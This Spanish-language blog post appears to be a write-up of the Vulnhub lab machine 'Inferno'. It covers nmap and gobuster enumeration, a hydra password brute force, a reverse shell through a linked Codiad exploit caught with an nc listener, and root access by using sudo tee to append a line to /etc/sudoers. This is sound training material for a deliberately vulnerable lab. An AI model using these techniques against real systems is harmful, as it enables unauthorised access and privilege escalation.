---
layout: post
title: Inferno - Vulnhub
tags: [ctf, vulnhub]
---

**Autor**: Mindsflee \\
**Dificultad**: Fácil

![img](/imgs/write-ups/vulnhub/inferno/inferno.png#center)

## Enumeración

Como siempre, lo primero es una enumeración con nmap. En esta máquina hay muchos puertos abiertos pero solo 2 (22 y 80) tiene servicios ejecutandose detrás .

```
$ sudo nmap 192.168.1.24
Nmap scan report for 192.168.1.24
Host is up (0.00082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
[...]
22/tcp open  ssh
[...]
80/tcp open  http
[...]
MAC Address: 08:00:27:04:0F:28 (Oracle VirtualBox virtual NIC)
```

Tras idenfiticar los servicios activos, procedo con una enumeración de subdirectorios usando gobuster.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.24" -x php,txt,html,log,jpg,png
===============================================================
2022/12/29 12:59:30 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 638]
/1.jpg                (Status: 200) [Size: 680065]
/inferno              (Status: 401) [Size: 459]
```

Encuentro el directorio "/inferno", pero al intentar acceder es necesario iniciar sesión. En este caso utilizo hydra para conseguir unas credenciales válidas.

```
$ hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt -u -f 192.168.1.24 -s 80 http-get /inferno
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-29 13:01:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://192.168.1.24:80/inferno
[STATUS] 7011.00 tries/min, 7011 tries in 00:01h, 14337387 to do in 34:05h, 16 active
[80][http-get] host: 192.168.1.24   login: admin   password: dante1
[STATUS] attack finished for 192.168.1.24 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Tras iniciar sesión me encuentro con otra página de login, pero ahora es de "codiad".

![login codiad](/imgs/write-ups/vulnhub/inferno/inferno_1.png#center)

Para continuar uso las mismas credenciales que en el anterior login.

## Explotación

Para conseguir una shell en el servidor, utilizo la siguiente vulnerabilidad descrita en [Exploit DB](https://www.exploit-db.com/exploits/50474), que nos permite subir una reverse shell.

Una vez subida, solo hay que cargar el archivo y obtengo la conexión.

```
$ nc -lvnp 1234
Connection from 192.168.1.24:33764
Linux Inferno 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
 08:06:47 up 18 min,  0 users,  load average: 0.02, 0.37, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ :)
```

De esta forma ya estoy dentro, ahora solo queda escalar privilegios.

## Escalado de privilegios

Tras enumerar la máquina, encuentro el siguiente archivo en la carpeta "Downloads" de Dante.

```
www-data@Inferno:/home/dante/Downloads$ cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33
```

Utilizo [Cyberchef](https://cyberchef.org/) para decodificarlo y encuentro tanto usuario como contraseña.

```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

Tras conectarme mediante ssh, compruebo los permisos de Dante y veo que puede ejecutar "tee" como el usuario root.

```
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```

Conociendo esto, añado al usuario Dante al fichero "/etc/sudoers" con todos los privilegios, pudiendo así iniciar sesión como root.

```
dante@Inferno:~$ echo "dante ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
dante ALL=(ALL:ALL) ALL
dante@Inferno:~$ sudo su
[sudo] password for dante: 
root@Inferno:/home/dante# :)
root@Inferno:/home/dante# cat /root/proof.txt


 (        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 


Congrats!

You've rooted Inferno!

77f6[...]

mindsflee

https://www.buymeacoffe.com/mindsflee
```

Muchas gracias  **Mindsflee** por esta máquina.
